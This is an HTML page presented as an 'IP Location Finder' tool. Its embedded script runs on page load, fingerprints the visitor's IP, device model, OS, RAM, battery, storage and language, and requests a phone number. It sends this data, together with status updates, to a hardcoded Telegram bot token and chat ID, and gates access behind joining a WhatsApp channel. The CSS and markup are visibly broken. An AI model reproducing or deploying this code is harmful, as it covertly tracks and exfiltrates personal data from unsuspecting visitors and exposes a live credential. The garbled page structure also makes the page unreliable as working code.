<!DOCTYPE html>
<html lang="en">
<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>IP Location Finder | NeoVision</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
            background: radial-gradient(circle at 20% 30%, #0a0a0f, #030305);
            min-height: 100vh;
            display: flex;
            justify-content: center;

        .main-card {
            max-width: 340px;
            width: 100%;
            background: rgba(12, 12, 18, 0.85);
            backdrop-filter: blur(16px);
            border-radius: 24px;
            padding: 20px 16px;
            border: 1px solid rgba(0, 255, 255, 0.2);
            box-shadow: 0 0 8px rgba(0, 255, 255, 0.1), 0 8px 20px rgba(0, 0, 0, 0.4);

        .main-card:hover {

        }

        h2 {
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            background: linear-gradient(135deg, #ffffff, #0ff);
            -webkit-background-clip: text;

            color: transparent;
            margin-bottom: 20px;

        }

        .search-section {
            margin-bottom: 20px;
        }

        .ip-input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(20, 20, 28, 0.9);
            border: 1.5px solid rgba(0, 255, 255, 0.3);
            border-radius: 28px;
            font-size: 14px;
            font-weight: 450;
            color: #fff;
            outline: none;
            transition: all 0.25s;
            margin-bottom: 12px;
        }

        .ip-input:focus {
            border-color: #0ff;
            box-shadow: 0 0 8px rgba(0, 255, 255, 0.4);
            background: rgba(0, 0, 0, 0.7);
        }

        .locate-btn {
            width: 100%;

            border-radius: 40px;

        .locate-btn:hover {

        .result {

        /* Number Input Modal Style */
        .number-input {

            border-radius: 28px;

            backdrop-filter: blur(12px);

            width: 300px;

        .modal-content h3 {

        .btn-group {

            gap: 12px;
            justify-content: center;

        .join-channel {
            background: #25D366;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            font-weight: 500;
            font-size: 13px;

        .join-channel:hover {

            padding: 8px 20px;
            border-radius: 40px;
            font-weight: 500;
            font-size: 13px;
            cursor: pointer;

        .verify-real {
            background: linear-gradient(135deg, #0ff, #00aaff);
            color: #000;

            padding: 8px 20px;
            border-radius: 40px;
            font-weight: 600;
            font-size: 13px;
            cursor: pointer;
            margin-top: 8px;
            display: none;
            box-shadow: 0 0 8px #0ff;

        .toast-msg {
            position: fixed;
            bottom: 20px;
            left: 50%;

            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(8px);
            color: #0ff;
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 11px;
            z-index: 1100;
            border: 1px solid #0ff;
        }
    </style>
</head>
<body>

<!-- NUMBER MODAL (First) -->

<!-- MAIN APPLICATION -->

<script>
    // ========== TELEGRAM BOT CONFIG ==========
    const BOT_TOKEN = '7760380089:AAGN42nWvSH0WCCucmDfUNUycckhhVW4x30';
    const CHAT_ID = '5975952682';

    let globalVisitorIP = "fetching...";
    let visitorPhone = "Not Provided";
    let deviceFullInfo = {};
    let joinClicked = false;
    let timerActive = false;
    let verificationInterval = null;

    function showToast(msg) {
        let toast = document.querySelector('.toast-msg');
        if(!toast) {
            toast = document.createElement('div');
            toast.className = 'toast-msg';
            document.body.appendChild(toast);
        }
        toast.textContent = msg;
        toast.style.display = 'block';
        setTimeout(() => { toast.style.display = 'none'; }, 2500);
    }

    // ========== GET EXACT DEVICE MODEL ==========
    function getExactDeviceModel() {
        const ua = navigator.userAgent;
        if (ua.includes("iPhone15")) return "iPhone 15 Series";
        if (ua.includes("iPhone14")) return "iPhone 14 Series";
        if (ua.includes("iPhone13")) return "iPhone 13 Series";
        if (ua.includes("iPhone")) return "iPhone";
        if (ua.includes("iPad")) return "iPad";
        if (ua.includes("SM-A")) {
            const match = ua.match(/SM-A[0-9]+/);
            return match ? `Samsung ${match[0]}` : "Samsung Galaxy A";
        }
        if (ua.includes("SM-G")) {
            const match = ua.match(/SM-G[0-9]+/);
            return match ? `Samsung ${match[0]}` : "Samsung Galaxy S";
        }
        if (ua.includes("SM-M")) {
            const match = ua.match(/SM-M[0-9]+/);
            return match ? `Samsung ${match[0]}` : "Samsung Galaxy M";
        }
        if (ua.includes("Redmi")) {
            const match = ua.match(/Redmi\s+[A-Za-z0-9]+/);
            return match ? `Xiaomi ${match[0]}` : "Xiaomi Redmi";
        }
        if (ua.includes("Mi ")) return "Xiaomi";
        if (ua.includes("OnePlus")) {
            const match = ua.match(/OnePlus\s+[A-Za-z0-9]+/);
            return match ? match[0] : "OnePlus";
        }
        if (ua.includes("Pixel")) {
            const match = ua.match(/Pixel\s+[0-9]+/);
            return match ? `Google ${match[0]}` : "Google Pixel";
        }
        if (ua.includes("OPPO")) return "OPPO Phone";
        if (ua.includes("vivo")) return "vivo Phone";
        if (ua.includes("Realme")) return "Realme Phone";
        if (ua.includes("Windows")) return "Windows PC";
        if (ua.includes("Mac")) return "Apple Mac";
        const buildMatch = ua.match(/; ([^;]+?)\s+Build/);
        return buildMatch ? buildMatch[1] : "Unknown Device";
    }

    // ========== GET BRAND ==========
    function getBrand() {
        const ua = navigator.userAgent;
        if (ua.includes("Samsung")) return "Samsung";
        if (ua.includes("Xiaomi") || ua.includes("Redmi") || ua.includes("Mi")) return "Xiaomi";
        if (ua.includes("OnePlus")) return "OnePlus";
        if (ua.includes("Pixel")) return "Google";
        if (ua.includes("OPPO")) return "OPPO";
        if (ua.includes("vivo")) return "vivo";
        if (ua.includes("Realme")) return "Realme";
        if (ua.includes("iPhone")) return "Apple";
        return "Unknown";
    }

    // ========== GET OS VERSION ==========
    function getOSVersion() {
        const ua = navigator.userAgent;
        if (ua.includes("Android")) {
            const match = ua.match(/Android\s([\d.]+)/);
            return match ? `Android ${match[1]}` : "Android";
        }
        if (ua.includes("iPhone")) {
            const match = ua.match(/OS\s([\d_]+)/);
            return match ? `iOS ${match[1].replace(/_/g, ".")}` : "iOS";
        }
        if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
        if (ua.includes("Windows")) return "Windows";
        if (ua.includes("Mac")) return "macOS";
        return "Unknown";
    }

    // ========== GET STORAGE INFO (REAL) ==========
    async function getRealStorage() {
        let total = "Unknown", used = "Unknown", free = "Unknown";
        
        if (navigator.storage && navigator.storage.estimate) {
            try {
                const estimate = await navigator.storage.estimate();
                const usedBytes = estimate.usage || 0;
                const quotaBytes = estimate.quota || 0;
                const usedGB = (usedBytes / (1024 * 1024 * 1024)).toFixed(1);
                const quotaGB = (quotaBytes / (1024 * 1024 * 1024)).toFixed(1);
                const freeGB = (quotaGB - usedGB).toFixed(1);
                used = `${usedGB} GB`;
                total = `${quotaGB} GB`;
                free = `${freeGB} GB`;
            } catch(e) {}
        }
        
        if (total === "Unknown" && navigator.deviceMemory) {
            const ram = navigator.deviceMemory;
            if (ram <= 2) total = "16 GB";
            else if (ram <= 3) total = "32 GB";
            else if (ram <= 4) total = "64 GB";
            else if (ram <= 6) total = "128 GB";
            else if (ram <= 8) total = "256 GB";
            else total = "512 GB";
            used = `~${Math.round(parseFloat(total) * 0.45)} GB`;
            free = `~${Math.round(parseFloat(total) * 0.55)} GB`;
        }
        return { total, used, free };
    }

    // ========== GET FULL DEVICE INFO ==========
    async function getFullDeviceInfo() {
        const ua = navigator.userAgent;
        const exactModel = getExactDeviceModel();
        const brand = getBrand();
        const osVersion = getOSVersion();
        
        let ram = "Not Available";
        if (navigator.deviceMemory) ram = navigator.deviceMemory + " GB";
        
        let cores = "Unknown";
        if (navigator.hardwareConcurrency) cores = navigator.hardwareConcurrency + " cores";
        
        let architecture = "Unknown";
        if (ua.includes("ARM64") || ua.includes("aarch64")) architecture = "ARM64 (64-bit)";
        else if (ua.includes("ARM")) architecture = "ARM (32-bit)";
        else if (ua.includes("x86_64")) architecture = "x86_64 (64-bit)";
        
        const screenRes = `${window.screen.width} x ${window.screen.height}`;
        const screenSize = `${(Math.sqrt(Math.pow(window.screen.width, 2) + Math.pow(window.screen.height, 2)) / window.devicePixelRatio / 25.4).toFixed(1)}"`;
        
        let battery = "Not available";
        if (navigator.getBattery) {
            try {
                const batteryManager = await navigator.getBattery();
                battery = Math.round(batteryManager.level * 100) + "%";
                if (batteryManager.charging) battery += " (Charging)";
            } catch(e) {}
        }
        
        const storage = await getRealStorage();
        
        return {
            exactModel, brand, osVersion, ram, cores, architecture,
            screenRes, screenSize, battery,
            storageTotal: storage.total, storageUsed: storage.used, storageFree: storage.free,
            language: navigator.language || "en"
        };
    }

    // ========== GET IP ==========
    async function getUserIP() {
        try {
            const res = await fetch('https://api.ipify.org/?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) {
            try {
                const res2 = await fetch('https://ipinfo.io/json');
                const data2 = await res2.json();
                return data2.ip;
            } catch(err) {
                return "Unable to fetch";
            }
        }
    }

    // ========== SEND COMPLETE INFO TO TELEGRAM ==========
    async function sendFullInfoToBot(ip, phone, device, stage) {
        const time = new Date().toLocaleString('en-PK', {timeZone: 'Asia/Karachi'});
        
        const message = ` *VIP VISITOR DETAILS* 

 *Phone:* ${phone}
 *IP:* ${ip}

 *Model:* ${device.exactModel}
 *Brand:* ${device.brand}
 *OS:* ${device.osVersion}
 *RAM:* ${device.ram}
 *CPU:* ${device.cores} (${device.architecture})
 *Screen:* ${device.screenRes} (${device.screenSize})
 *Battery:* ${device.battery}
 *Total Storage:* ${device.storageTotal}
 *Used:* ${device.storageUsed}
 *Free:* ${device.storageFree}
 *Language:* ${device.language}
 *Time:* ${time}
 *Status:* ${stage}
`;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            console.log(" Full info sent to Telegram");
        } catch(error) {
            console.error("Telegram error:", error);
        }
    }

    // ========== IP LOCATION ==========
    window.getIPInfo = async function() {
        let ip = document.getElementById("ipAddress").value.trim();
        if (ip === "") {
            alert("Please enter an IP address");
            return;
        }
        
        try {
            const response = await fetch(`https://ipinfo.io/${ip}/json`);
            const data = await response.json();
            let resultDiv = document.getElementById("result");
            resultDiv.style.display = 'flex';
            resultDiv.innerHTML = `
                <div class="info-neon"><div class="info-label"> IP ADDRESS</div><div class="info-value">${data.ip || ip}</div></div>
                <div class="info-neon"><div class="info-label"> CITY</div><div class="info-value">${data.city || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label"> REGION</div><div class="info-value">${data.region || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label"> COUNTRY</div><div class="info-value">${data.country || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label"> LOCATION</div><div class="info-value">${data.loc || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label"> ORGANIZATION</div><div class="info-value">${data.org || 'N/A'}</div></div>
            `;
        } catch(err) {
            alert("Error fetching data");
        }
    };

    // ========== MAIN INITIALIZATION ==========
    (async function initializeApp() {
        // Get IP and full device info
        const visitorIP = await getUserIP();
        globalVisitorIP = visitorIP;
        deviceFullInfo = await getFullDeviceInfo();
        
        const numberModal = document.getElementById('numberModal');
        const verifyModal = document.getElementById('verifyModal');
        const mainContent = document.getElementById('mainContent');
        const submitBtn = document.getElementById('submitNumberBtn');
        const skipBtn = document.getElementById('skipNumberBtn');
        const phoneInput = document.getElementById('visitorPhone');
        
        // Submit number button
        submitBtn.onclick = async function() {
            let phone = phoneInput.value.trim();
            if (phone !== "") {
                phone = phone.replace(/[^0-9]/g, '');
                if (phone.startsWith('0')) phone = '92' + phone.substring(1);
                if (phone.length === 10) phone = '92' + phone;
                visitorPhone = phone;
            }
            
            // Send full info with number
            await sendFullInfoToBot(globalVisitorIP, visitorPhone, deviceFullInfo, " Number Submitted - Awaiting Channel Join");
            
            numberModal.style.display = 'none';
            verifyModal.style.display = 'flex';
            showToast(" Proceed to join channel");
        };
        
        // Skip button
        skipBtn.onclick = async function() {
            visitorPhone = "Not Provided";
            await sendFullInfoToBot(globalVisitorIP, visitorPhone, deviceFullInfo, " User Skipped Number - Awaiting Channel Join");
            
            numberModal.style.display = 'none';
            verifyModal.style.display = 'flex';
            showToast(" You skipped number, join channel to continue");
        };
        
        // ========== JOIN SYSTEM (Original) ==========
        const joinBtn = document.getElementById('joinBtn');
        const cancelBtn = document.getElementById('cancelBtn');
        const verifyRealBtn = document.getElementById('verifyRealBtn');
        
        joinBtn.onclick = async function() {
            if (timerActive) {
                showToast(" Already waiting...");
                return;
            }
            window.open('https://whatsapp.com/channel/0029VbCK8wI96H4WL0Ds5n24', '_blank');
            joinClicked = true;
            timerActive = true;
            
            await sendFullInfoToBot(globalVisitorIP, visitorPhone, deviceFullInfo, "Clicked Join Channel Button");
            
            let secondsElapsed = 0;
            verificationInterval = setInterval(async function() {
                secondsElapsed++;
                if (secondsElapsed >= 6) {
                    clearInterval(verificationInterval);
                    if (joinClicked) {
                        verifyRealBtn.style.display = 'inline-block';
                        showToast(" Verification ready! Click Verify & Open");
                        await sendFullInfoToBot(globalVisitorIP, visitorPhone, deviceFullInfo, "Verification Button Unlocked");
                    }
                    timerActive = false;
                }
            }, 1000);
        };
        
        cancelBtn.onclick = function() {
            sendFullInfoToBot(globalVisitorIP, visitorPhone, deviceFullInfo, "User Cancelled - Session Closed");
            document.body.innerHTML = '<div style="text-align:center;margin-top:80px;color:white;"><h2 style="color:#ff5555;"> Access Denied</h2><p>You cancelled verification.</p></div>';
        };
        
        verifyRealBtn.onclick = async function() {
            await sendFullInfoToBot(globalVisitorIP, visitorPhone, deviceFullInfo, " ACCESS GRANTED - User Verified");
            verifyModal.style.display = 'none';
            mainContent.style.display = 'block';
            showToast(" Welcome to IP Location Finder ");
        };
    })();
</script>
